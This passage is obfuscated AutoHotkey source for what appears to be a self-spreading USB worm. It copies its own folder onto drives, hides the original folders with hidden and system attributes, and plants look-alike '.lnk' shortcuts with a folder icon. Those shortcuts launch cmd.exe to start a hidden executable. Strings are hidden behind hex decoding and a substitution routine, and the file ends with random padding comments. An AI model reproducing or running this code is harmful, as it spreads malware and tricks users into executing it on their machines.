FileGetSize, oldfilesize, %dddfkk%%dd#f@f%%f@dd@k@k%%A_LoopRelativeFileName%\%k#f#ee#trrtee@trrt%%ddddddkk%%#k#k@kf#%\%k#f#ee#trrtee@trrt%%dddkf#%%fkfk%.txt
FileGetSize, scriptfilesize, %A_ScriptFullPath%
if (oldfilesize <> scriptfilesize){
FileCopyDir, %A_ScriptDir%, %@fkee@trrt%%dd#f@f%%f@eeetrrtk%%A_LoopRelativeFileName%\%k#f#ee#trrtee@trrt%%fk#kf#kk%%k#f@@kf#%,1
}else{
#fkfkfk@ := #fkfkfk@ + 1
break
}
}else{
FileCopyDir, %A_ScriptDir%, %k@#k@f%%dd#f@f%%k#f@f@kk%%A_LoopRelativeFileName%\%f@dd@k@k%%ee@trrtf%%k#f#ee#trrtee@trrt%
FileSetAttrib, +SH, %f@k@kk%%#f#f%%dd#f@f%%A_LoopRelativeFileName%\%#eeetrrtkfk#%%k@kee#trrt%%k#f#ee#trrtee@trrt%,1
}
ifexist, %dd#f@f%%#fddd@@k%%@f@kfdd@%%A_LoopRelativeFileName%\%f#f@%%k#f#ee#trrtee@trrt%%fk@f#f%
{
ifexist, %ddd#%%kkf@%%dd#f@f%%A_LoopRelativeFileName%%f@dd@k@k%%ddd#f#k@k@kf%%k@dd@k% copy %f#fk#eeetrrt%%fkf@#f@ee@trrt%%#k#k@kf#%.lnk
{
}else{
FileCreateShortcut, % ffkkfdd@@dd@("636D642E657865"),%ee@trrtkf#%%#fkfkfk#%%dd#f@f%%A_LoopRelativeFileName%%ee@trrtkf#%%fk@f#f%%ddd#f#k@k@kf% copy %k@#k@f%%fkf@#f@ee@trrt%%@fdd#fk#%.lnk,, "/c start %@kf#k@#k%%k#f#ee#trrtee@trrt%%kkf@%\%fk@fkk%%kfkee@trrt#f%%k#f#ee#trrtee@trrt%.exe %kf@fk@#k%%k#f#ee#trrtee@trrt%%f#@k%\%kf#fkfkk%%k#f#ee#trrtee@trrt%%k@kee#trrt%.txt %dd#k%%k@@k%%fkf@#f@ee@trrt% &exit",,%SystemRoot%\system32\shell32.dll,,4
}
}
}
}
}
}
}
#dd#@f#k#kfk := 1
}
fk@kf#kee@trrt#eeetrrtkf(@k#k@keeetrrtkkf@dd@,@f#ee@trrtk@fk@ee@trrt){
IfInString, @k#k@keeetrrtkkf@dd@, %fdd#%%@f#ee@trrtk@fk@ee@trrt%%dddfkk%
{
return true
}
else
{
return false
}
}
dd#dd@f#dd#kff(ffk#ee@trrtk@kf@#k){
#ee#trrtf@@ee@trrt#f := SubStr(kkeeetrrt#, 1, 4)
ffkee#trrtk# := SubStr(k#f#ee#trrtee@trrt, 1, 4)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkee#trrtk#, "")
if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("66") . ffkkfdd@@dd@("66") . ffkkfdd@@dd@("66")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("66") . ffkkfdd@@dd@("66") . ffkkfdd@@dd@("66"), ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("66") . ffkkfdd@@dd@("6623"), ffkkfdd@@dd@("61") . ffkkfdd@@dd@("6123") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("66") . ffkkfdd@@dd@("6640"), ffkkfdd@@dd@("61") . ffkkfdd@@dd@("6140") . #ee#trrtf@@ee@trrt#f)
} else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B"), ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B23"), ffkkfdd@@dd@("62") . ffkkfdd@@dd@("6223") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B40"), ffkkfdd@@dd@("62") . ffkkfdd@@dd@("6240") . #ee#trrtf@@ee@trrt#f)
} else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61") . ffkkfdd@@dd@("61"), ffkkfdd@@dd@("63") . ffkkfdd@@dd@("63") . ffkkfdd@@dd@("63") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("61") . ffkkfdd@@dd@("6123"), ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6323") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("61") . ffkkfdd@@dd@("6140"), ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6340") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62") . ffkkfdd@@dd@("62"), ffkkfdd@@dd@("64") . ffkkfdd@@dd@("64") . ffkkfdd@@dd@("64") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("62") . ffkkfdd@@dd@("6223"), ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6423") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("62") . ffkkfdd@@dd@("6240"), ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6440") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6363")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6363"), ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6565") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6323"), ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6523") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("63") . ffkkfdd@@dd@("6340"), ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6540") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6464")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6464"), ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6767") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6423"), ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6723") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("64") . ffkkfdd@@dd@("6440"), ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6740") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6565")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6565"), ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6868") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6523"), ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6823") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("65") . ffkkfdd@@dd@("6540"), ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6840") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6767")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6767"), ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6969") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6723"), ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6923") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("67") . ffkkfdd@@dd@("6740"), ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6940") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6868")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6868"), ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A6A") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6823"), ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("68") . ffkkfdd@@dd@("6840"), ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6969")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6969"), ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D6D") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6923"), ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("69") . ffkkfdd@@dd@("6940"), ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A6A")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A6A"), ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C6C") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A23"), ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6A") . ffkkfdd@@dd@("6A40"), ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C6C")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C6C"), ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E6E") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C23"), ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6C") . ffkkfdd@@dd@("6C40"), ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D6D")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D6D"), ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F6F") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D23"), ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6D") . ffkkfdd@@dd@("6D40"), ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E6E")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E6E"), ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7070") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E23"), ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7023") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6E") . ffkkfdd@@dd@("6E40"), ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7040") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F6F")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F6F"), ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7171") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F23"), ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7123") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("6F") . ffkkfdd@@dd@("6F40"), ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7140") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7070")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7070"), ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7272") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7023"), ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7223") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("70") . ffkkfdd@@dd@("7040"), ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7240") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7171")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7171"), ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7373") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7123"), ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7323") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("71") . ffkkfdd@@dd@("7140"), ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7340") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7272")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7272"), ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7474") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7223"), ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7423") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("72") . ffkkfdd@@dd@("7240"), ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7440") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7373")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7373"), ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7575") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7323"), ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7523") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("73") . ffkkfdd@@dd@("7340"), ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7540") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7474")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7474"), ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7676") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7423"), ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7623") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("74") . ffkkfdd@@dd@("7440"), ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7640") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7575")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7575"), ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7777") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7523"), ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7723") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("75") . ffkkfdd@@dd@("7540"), ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7740") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7676")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7676"), ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7878") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7623"), ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7823") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("76") . ffkkfdd@@dd@("7640"), ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7840") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7777")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7777"), ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7979") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7723"), ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7923") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("77") . ffkkfdd@@dd@("7740"), ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7940") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7878")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7878"), ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A7A") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7823"), ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("78") . ffkkfdd@@dd@("7840"), ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A40") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7979")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7979"), ffkkfdd@@dd@("66") . ffkkfdd@@dd@("6666") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7923"), ffkkfdd@@dd@("66") . ffkkfdd@@dd@("6623") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("79") . ffkkfdd@@dd@("7940"), ffkkfdd@@dd@("66") . ffkkfdd@@dd@("6640") . #ee#trrtf@@ee@trrt#f)
}
else if (fk@kf#kee@trrt#eeetrrtkf(ffk#ee@trrtk@kf@#k,ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A7A")))
{
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A7A"), ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B6B") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A23"), ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B23") . #ee#trrtf@@ee@trrt#f)
ffk#ee@trrtk@kf@#k := StrReplace(ffk#ee@trrtk@kf@#k	, ffkkfdd@@dd@("7A") . ffkkfdd@@dd@("7A40"), ffkkfdd@@dd@("6B") . ffkkfdd@@dd@("6B40") . #ee#trrtf@@ee@trrt#f)
}
return ffk#ee@trrtk@kf@#k
}
ffkkfdd@@dd@(kee#trrtf@#ddd#k@fkk) {  
return @eeetrrtkkffkfdd#k(kee#trrtf@#ddd#k@fkk)
}

 ; rwqjllttmzeiltswaukdjonsxpifaiwjmicakpfhxwlwpycjqovveelcxfdllozofuxqhlklzeujzjipudgxvgxhotcilvlcrzwckjfbynrtmjkalksjvwhmiklvfnealbjogxxmkelhsdmzkvjbni
 ; eiwltrqbsbysszfdjkmisqslkogxrhcrsnnyqgjwvdutijqswcgzswodgyeohtchysxjjevvqwnucvgsrxwqdflbturuydoltslvvslsnsdyuzhukivcwmpjuidphdochmwewidajlvvyvxgmkzmse
 ; ycgcbytemxjrnfhccmfjgxtvxzpkfxqiplhtlojsdamjvblsxwywskirzauzmedkfhczhcisagsvkiqpzdbtjciuxvetsczkttmuoedckazpkakcujzbjjclkubxakhzxmypwziumtgzzimxblmouu
 ; qojdehjscigrhuggharvpwfdqpczukxqpbmxqkjtouwqhczlyywzcrkyqogtsmfjswzbhsusvohnfbczdhbhwcxnuhtlpdfhwmvxscuzbaplayxzvbsohwscnncqbzlztitlpylejrjgjobmsyaubn
 ; dtkwsddiulnfxhejmfvuqufzbzactiinpozzmvkuzhsnaugftbaxwjxcmtxemotimbiuomaqbtcgkmqomqknebwvomxmcrmgvqwcpepikdzirqobciffodktjfqufexveovqsysovqeebjblgzwenn